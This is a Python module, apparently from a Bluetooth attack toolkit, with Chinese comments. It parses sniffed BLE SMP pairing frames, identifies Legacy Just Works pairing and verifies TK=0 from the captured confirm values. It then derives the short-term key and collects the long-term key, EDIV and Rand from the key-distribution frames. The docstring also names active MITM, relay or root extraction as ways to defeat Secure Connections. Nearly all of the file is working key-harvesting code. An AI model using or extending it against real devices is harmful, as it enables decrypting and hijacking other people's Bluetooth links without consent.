#!/usr/bin/env python3
# att-fuzz/core/smp.py
"""
SMP(LE Security Manager, L2CAP CID 0x0006)PDU 解析 + 配对方式判定 + legacy 密钥收割编排。

被动嗅探视角:配对交换在加密前全程明文可见。本模块从空口 SMP SDU 累积
Pairing Req/Rsp/Confirm/Random/密钥分发帧,判定配对方式(LE Secure Connections
vs Legacy),并对 legacy Just Works(TK=0)驱动 STK 推导(bt_crypto.s1)。

字节序:SmpExchange 内 SMP 字段按**空口序(小端)**存储(字段索引直观:
preq[0]=opcode, preq[1]=IOcap, preq[2]=OOB, preq[3]=AuthReq ...)。
仅在调用 core/bt_crypto 时逆序成大端(c1/s1 需大端,与 crackle/规范序一致)。
收割的 LTK 以大端上报(reverse 空口 16 字节),即控制器存储/复用序。

配对方式判定双证据:AuthReq 的 SC 位(0x08)置位 = SC;或出现 Pairing Public
Key PDU(0x0C,SC 才有 ECDH 交换)。SC 被动无解(须转主动 MITM/relay 或 root 提取);
Legacy Just Works TK=0 可被动收割 STK -> 解密密钥分发帧取 LTK。
"""

import logging
from dataclasses import dataclass, field

from . import bt_crypto

log = logging.getLogger("att-fuzz.smp")

# SMP opcode(LE Security Manager)
OP_PAIRING_REQ = 0x01
OP_PAIRING_RSP = 0x02
OP_PAIRING_CONFIRM = 0x03
OP_PAIRING_RANDOM = 0x04
OP_PAIRING_FAILED = 0x05
OP_ENCRYPTION_INFORMATION = 0x06   # LTK(16)
OP_MASTER_IDENTIFICATION = 0x07    # EDIV(2) + RAND(8)
OP_IDENTITY_INFORMATION = 0x08     # IRK(16)
OP_IDENTITY_ADDRESS = 0x09         # addr type(1) + addr(6)
OP_SIGNING_INFORMATION = 0x0A     # CSRK(16)
OP_PAIRING_PUBLIC_KEY = 0x0C       # SC only: X(32)+Y(32)
OP_PAIRING_DHKEY_CHECK = 0x0D      # SC only
OP_KEYPRESS_NOTIFICATION = 0x0E

AUTHREQ_BONDING = 0x01
AUTHREQ_MITM = 0x04
AUTHREQ_SC = 0x08
AUTHREQ_KEYPRESS = 0x10

IOCAP_DISPLAY_ONLY = 0x00
IOCAP_DISPLAY_YESNO = 0x01
IOCAP_KEYBOARD_ONLY = 0x02
IOCAP_NO_INPUT_NO_OUTPUT = 0x03
IOCAP_KEYBOARD_DISPLAY = 0x04


def _rev(b: bytes, n: int = None) -> bytes:
    """空口小端 -> 大端(逆序),供 bt_crypto 用。"""
    b = bytes(b)
    if n is not None:
        b = b[:n]
    return bytes(reversed(b))


def parse_pdu(pdu: bytes) -> dict:
    """解析一条 SMP PDU(去掉 L2CAP 头后的 SDU,空口小端序)。
    返回 {opcode, name, fields...}。字段值保留空口序(直观)。"""
    if not pdu:
        return {"opcode": None, "name": "EMPTY"}
    op = pdu[0]
    body = pdu[1:]
    d = {"opcode": op}
    if op in (OP_PAIRING_REQ, OP_PAIRING_RSP):
        d["name"] = "PAIRING_REQ" if op == OP_PAIRING_REQ else "PAIRING_RSP"
        if len(body) >= 6:
            d["iocap"] = body[0]; d["oob"] = body[1]; d["authreq"] = body[2]
            d["maxkeysize"] = body[3]
            d["init_keydist"] = body[4]; d["resp_keydist"] = body[5]
        else:
            d["name"] = "MALFORMED"
    elif op == OP_PAIRING_CONFIRM:
        d["name"] = "PAIRING_CONFIRM"; d["confirm"] = body[:16]
    elif op == OP_PAIRING_RANDOM:
        d["name"] = "PAIRING_RANDOM"; d["random"] = body[:16]
    elif op == OP_PAIRING_FAILED:
        d["name"] = "PAIRING_FAILED"; d["reason"] = body[0] if body else None
    elif op == OP_ENCRYPTION_INFORMATION:
        d["name"] = "ENCRYPTION_INFORMATION"; d["ltk"] = body[:16]
    elif op == OP_MASTER_IDENTIFICATION:
        d["name"] = "MASTER_IDENTIFICATION"
        if len(body) >= 10:
            d["ediv"] = body[:2]; d["rand"] = body[2:10]
    elif op == OP_IDENTITY_INFORMATION:
        d["name"] = "IDENTITY_INFORMATION"; d["irk"] = body[:16]
    elif op == OP_IDENTITY_ADDRESS:
        d["name"] = "IDENTITY_ADDRESS"
        if len(body) >= 7:
            d["addr_type"] = body[0]; d["addr"] = body[1:7]
    elif op == OP_SIGNING_INFORMATION:
        d["name"] = "SIGNING_INFORMATION"; d["csrk"] = body[:16]
    elif op == OP_PAIRING_PUBLIC_KEY:
        d["name"] = "PAIRING_PUBLIC_KEY"
        d["x"] = body[:32]; d["y"] = body[32:64]
    elif op == OP_PAIRING_DHKEY_CHECK:
        d["name"] = "PAIRING_DHKEY_CHECK"; d["dhkey_check"] = body[:16]
    elif op == OP_KEYPRESS_NOTIFICATION:
        d["name"] = "KEYPRESS_NOTIFICATION"; d["value"] = body[0] if body else None
    else:
        d["name"] = "UNKNOWN_0x%02X" % op
    return d


@dataclass
class SmpExchange:
    """一条连接的 SMP 交换累积器(被动嗅探视角)。字段全部空口序(小端)。
    地址 ia/ra/iat/rat 由 sniffer 从 CONNECT_IND 注入(set_addresses)。"""
    preq: bytes | None = None          # 7 字节 Pairing Request(空口序)
    pres: bytes | None = None          # 7 字节 Pairing Response(空口序)
    mconfirm: bytes | None = None
    sconfirm: bytes | None = None
    mrand: bytes | None = None
    srand: bytes | None = None
    public_key_seen: bool = False
    dhkey_check_seen: bool = False
    pairing_failed: int | None = None
    ltk: bytes | None = None           # 收割的 LTK(空口序;ltk_be = _rev)
    ediv: bytes | None = None
    rand: bytes | None = None          # Master Identification 的 Rand
    irk: bytes | None = None
    ia: bytes | None = None            # 空口序
    ra: bytes | None = None
    iat: int | None = None
    rat: int | None = None
    events: list = field(default_factory=list)

    def set_addresses(self, ia_wire: bytes, ra_wire: bytes, iat: int, rat: int):
        """从 CONNECT_IND 注入地址(空口序)。"""
        self.ia = bytes(ia_wire)[:6]; self.ra = bytes(ra_wire)[:6]
        self.iat = iat; self.rat = rat

    def feed(self, pdu: bytes) -> dict:
        """喂一条 SMP SDU(空口序)。返回 parse_pdu 结果(台账用)。"""
        d = parse_pdu(pdu)
        self.events.append(d)
        op = d["opcode"]
        if op == OP_PAIRING_REQ and d.get("name") != "MALFORMED":
            self.preq = pdu[:7]
        elif op == OP_PAIRING_RSP and d.get("name") != "MALFORMED":
            self.pres = pdu[:7]
        elif op == OP_PAIRING_CONFIRM and d.get("confirm"):
            if self.mconfirm is None:
                self.mconfirm = d["confirm"]
            else:
                self.sconfirm = d["confirm"]
        elif op == OP_PAIRING_RANDOM and d.get("random"):
            if self.mrand is None:
                self.mrand = d["random"]
            else:
                self.srand = d["random"]
        elif op == OP_PAIRING_PUBLIC_KEY:
            self.public_key_seen = True
        elif op == OP_PAIRING_DHKEY_CHECK:
            self.dhkey_check_seen = True
        elif op == OP_PAIRING_FAILED:
            self.pairing_failed = d.get("reason")
        elif op == OP_ENCRYPTION_INFORMATION and d.get("ltk"):
            self.ltk = d["ltk"]
        elif op == OP_MASTER_IDENTIFICATION:
            self.ediv = d.get("ediv"); self.rand = d.get("rand")
        elif op == OP_IDENTITY_INFORMATION:
            self.irk = d.get("irk")
        return d

    # ---------- 配对方式判定 ----------

    def _authreq(self, p: bytes | None) -> int:
        return p[3] if (p and len(p) >= 4) else 0

    @property
    def is_secure_connections(self) -> bool:
        """双证据:AuthReq SC 位(preq 或 pres)或 出现 Public Key。"""
        sc = bool(self._authreq(self.preq) & AUTHREQ_SC) or \
             bool(self._authreq(self.pres) & AUTHREQ_SC)
        return sc or self.public_key_seen

    @property
    def legacy_method(self) -> str | None:
        """legacy 配对方式(仅 is_secure_connections=False 时有意义)。
        OOB / JustWorks / Passkey / Unfinished。基于 SMP IO 能力矩阵(Spec 表 2.2):
        任一方 NoInputNoOutput -> JustWorks(MITM 不可满足);MITM 且双方均有键/显
        能力 -> Passkey;否则 MITM=0 -> JustWorks。authoritative 的 TK=0 判定靠
        verify_confirms()。"""
        if self.preq is None or self.pres is None:
            return None
        if len(self.preq) < 4 or len(self.pres) < 4:
            return "Unfinished"
        oob = self.preq[2] | self.pres[2]
        if oob:
            return "OOB"
        ioc_i = self.preq[1]; ioc_r = self.pres[1]
        mitm = bool(self._authreq(self.preq) & AUTHREQ_MITM) or \
               bool(self._authreq(self.pres) & AUTHREQ_MITM)
        noio = (ioc_i == IOCAP_NO_INPUT_NO_OUTPUT or
                ioc_r == IOCAP_NO_INPUT_NO_OUTPUT)
        if not mitm or noio:
            return "JustWorks"      # TK=0
        # MITM 且双方均非 NoInputNoOutput:涉及键盘 -> Passkey(6 位 TK,需暴力)
        kbd = (ioc_i in (IOCAP_KEYBOARD_ONLY, IOCAP_KEYBOARD_DISPLAY) or
               ioc_r in (IOCAP_KEYBOARD_ONLY, IOCAP_KEYBOARD_DISPLAY))
        if kbd:
            return "Passkey"
        return "JustWorks"          # DisplayOnly/DisplayYesNo 组合在 legacy 无 NumComp -> JustWorks

    @property
    def ltk_be(self) -> bytes | None:
        """收割的 LTK(大端,控制器存储序)。"""
        return _rev(self.ltk, 16) if self.ltk else None

    # ---------- 密钥推导 ----------

    def can_derive_stk(self) -> bool:
        """是否具备 STK 推导条件(legacy Just Works):两 Random + 两地址 + preq/pres 齐全。"""
        return (not self.is_secure_connections
                and self.mrand and self.srand
                and self.preq and self.pres
                and self.ia and self.ra
                and self.iat is not None and self.rat is not None)

    def derive_stk(self) -> bytes | None:
        """Legacy Just Works:STK = s1(TK=0, Srand, Mrand)。返回大端 STK;条件不足 None。"""
        if not self.can_derive_stk():
            return None
        return bt_crypto.s1(b"\x00" * 16, _rev(self.srand, 16), _rev(self.mrand, 16))

    def verify_confirms(self) -> bool | None:
        """用 TK=0 验证捕获的 Mconfirm/Sconfirm(Just Works 帧级判定)。
        True=匹配(确认 TK=0 Just Works),False=不匹配(非 Just Works/TK 非0),
        None=缺 confirm/random/地址无法验证。"""
        if not (self.mconfirm and self.sconfirm and self.mrand and self.srand
                and self.preq and self.pres and self.ia and self.ra
                and self.iat is not None and self.rat is not None):
            return None
        tk = b"\x00" * 16
        mc = bt_crypto.c1(tk, _rev(self.mrand, 16), _rev(self.preq, 7),
                          _rev(self.pres, 7), self.iat, self.rat,
                          _rev(self.ia, 6), _rev(self.ra, 6))
        sc = bt_crypto.c1(tk, _rev(self.srand, 16), _rev(self.preq, 7),
                          _rev(self.pres, 7), self.iat, self.rat,
                          _rev(self.ia, 6), _rev(self.ra, 6))
        # c1 返回大端;self.mconfirm/sconfirm 是空口序 -> 比较前逆序
        return mc == _rev(self.mconfirm, 16) and sc == _rev(self.sconfirm, 16)

    def summary(self) -> dict:
        return {
            "secure_connections": self.is_secure_connections,
            "legacy_method": self.legacy_method if not self.is_secure_connections else None,
            "confirm_verified_justworks": self.verify_confirms(),
            "stk": self.derive_stk().hex() if self.can_derive_stk() else None,
            "ltk": self.ltk_be.hex() if self.ltk else None,
            "ediv": self.ediv.hex() if self.ediv else None,
        }
